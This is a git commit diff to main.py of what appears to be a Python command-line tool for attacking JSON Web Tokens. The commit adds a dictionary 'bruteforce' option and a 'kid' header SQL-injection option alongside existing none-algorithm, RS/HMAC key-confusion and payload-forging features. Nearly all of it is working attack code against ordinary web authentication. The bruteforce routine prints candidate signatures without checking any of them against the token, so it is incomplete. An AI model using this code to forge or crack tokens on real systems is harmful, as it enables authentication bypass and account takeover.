ab1606ac00dfe19e7845f335cde81c63be6f6268
matthieu <matthieubouamama@gmail.com>
2020-10-28 00:14:15 +0100

    add new vulnerabilities

--- main.py
+++ main.py
@@ -6,6 +6,8 @@ import os.path
 from os import path
 import hmac
 
+from texttable import Texttable
+
 
 def signature(jwtJson, key):
     if jwtJson["header"]["alg"] == "HS256":
@@ -15,15 +17,17 @@ def signature(jwtJson, key):
         return jwt + "." + newSig
 
 
-
 def encodedToJson(encodedString):
     decode = base64.b64decode(encodedString + '=' * (-len(encodedString) % 4))
+    print(json.loads(decode))
     return json.loads(decode)
 
 
 def encodeJwt(jwtJson):
-    headerEncoded = base64.urlsafe_b64encode(json.dumps(jwtJson["header"]).encode('utf-8')).decode('utf-8').strip('=')
-    payloadEncoded = base64.urlsafe_b64encode(json.dumps(jwtJson["payload"], separators=(',', ':')).encode()).decode('utf-8').strip('=')
+    headerEncoded = base64.urlsafe_b64encode(
+        json.dumps(jwtJson["header"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
+    payloadEncoded = base64.urlsafe_b64encode(
+        json.dumps(jwtJson["payload"], separators=(',', ':')).encode('UTF-8')).decode('UTF-8').strip('=')
     return headerEncoded + "." + payloadEncoded
 
 
@@ -61,17 +65,48 @@ def checkHmac(jwtJson, file):
     return signature(jwtJson, open(file).read())
 
 
+def bruteforceDict(jwt, fileName):
+    jwtJson = jwtToJson(jwt)
+    with open(fileName, 'r') as file:
+        allPassword = [line.rstrip() for line in file]
+    file.close()
+    table = Texttable()
+    table.set_cols_align(["c", "m"])
+    table.set_cols_valign(["m", "m"])
+    table.set_max_width(0)
+    table.header(["Passord", "Key"])
+    for password in allPassword:
+        table.add_row([password, signature(jwtJson, password)])
+    print(table.draw() + "\n")
+
+
+def injectSqlKid(jwt, injection):
+    jwtJson = jwtToJson(jwt)
+    jwtJson["header"]["kid"] = injection
+    return signature(jwtJson, "")
+
+
 @click.command()
 @click.argument('jwt')
 @click.option("--print", is_flag=True, help="Print Decoded JWT")
 @click.option("--payload", "-p", help="New payload json format")
 @click.option("--none-vulnerability", '-none', is_flag=True, help="Check None Alg vulnerability")
 @click.option("--hmac", help="Check RS/HMAC Alg vulnerability")
-def main(jwt, print, payload, none_vulnerability, hmac):
+@click.option("--bruteforce", help="Bruteforce to guess th secret used to sign the token")
+@click.option("--kid", help="Kid Injection sql")
+def main(jwt, print, payload, none_vulnerability, hmac, bruteforce, kid):
     if payload:
         jwtJson = changePayload(jwtToJson(jwt), json.loads(payload))
-        jwt = encodeJwt(jwtJson)
+        jwt = encodeJwt(jwtJson) + "." + jwtJson["signature"]
         click.echo(jwt)
+    if kid:
+        click.echo(injectSqlKid(jwt, kid))
+    if bruteforce:
+        if path.exists(bruteforce):
+            bruteforceDict(jwt, bruteforce)
+            pass
+        else:
+            click.echo("File not found")
     if hmac:
         if path.exists(hmac):
             jwt = checkHmac(jwtToJson(jwt), hmac)
